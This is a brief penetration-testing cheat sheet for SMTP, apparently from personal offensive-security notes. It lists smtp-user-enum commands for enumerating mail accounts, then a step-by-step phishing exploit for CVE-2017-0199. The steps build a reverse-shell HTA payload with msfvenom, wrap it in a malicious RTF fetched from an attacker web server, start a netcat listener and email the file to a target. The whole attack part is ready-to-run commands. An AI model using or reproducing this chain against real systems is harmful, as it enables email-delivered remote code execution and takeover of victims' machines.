# Simple Mail Transfer Protocol

#### Enumerate users

Without Domain

```
smtp-user-enum -M VRFY -U wordlist -t IP
```

With Domain

```
smtp-user-enum -M VRFY -U wordlist -t IP -d example.com
```

#### [RTF Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)

1. msfvenom -p windows/shell\_reverse\_tcp LHOST=local-IP LPORT=443 -f hta-psh -o msfv.hta
2. python2 cve-2017-0199\_toolkit.py -M gen -t RTF -w MailFile.RTF -u http://local-WebServIP:Port/msfv.hta
3. python2 -m SimpleHTTPServer 80
4. nc -lnvp 443
5. sendEmail -f FromEmail@example.com -t ToEmail@example.com -u "Subject" -m "Message" -a MailFile.RTF -s TargetIP -v
